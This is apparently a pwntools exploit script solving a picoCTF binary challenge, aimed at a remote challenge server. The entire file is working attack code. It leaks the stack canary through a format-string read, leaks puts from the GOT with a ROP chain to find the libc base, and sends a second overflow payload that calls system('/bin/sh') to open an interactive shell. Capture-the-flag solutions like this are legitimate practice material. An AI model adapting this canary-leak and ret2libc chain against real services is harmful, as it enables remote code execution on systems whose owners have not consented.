#!usr/bin/python3
from pwn import *
from threading import Thread
from queue import Queue

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = 'jupiter.challenges.picoctf.org', 44628

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

# use fuzzer to get the correct guess value
guess = -3727

# get canary leak
io.sendlineafter(b'guess?', str(guess).encode())
io.sendlineafter(b'Name?', f'%135$lx'.encode())
io.recvuntil(b'Congrats: ')
canary = int(io.recvline()[:-1].decode(), 16)

# get libc leak
offset = 528 # count with cyclic of EBP right before stack cookie check 
payload = flat({
    512: [
        canary,
        p32(0x01)*((528 - 512 - 4) // 4),          # padding
        elf.plt['puts'],
        elf.sym['main'],
        elf.got['puts'],
    ]
})

io.sendlineafter(b'guess?', str(guess).encode())
io.sendlineafter(b'Name?', payload)

# final exploit
io.recvlines(2)
puts = unpack(io.recv(4))
libc_base = puts - 0x067560
system = libc_base + 0x03cf10
binsh = libc_base + 0x17b9db

offset = 528 # count with cyclic of EBP right before stack cookie check 
payload = flat({
    512: [
        canary,
        p32(0x01)*((528 - 512 - 4) // 4),          # padding
        system,
        0x0804844e, # add esp, 8; pop ebx; ret;
        binsh
    ]
})

io.sendlineafter(b'guess?', str(guess).encode())
io.sendlineafter(b'Name?', payload)

info('canary value: %#x', canary)
info('puts: %#x', puts)
info('libc addr: %#x', libc_base)

io.interactive()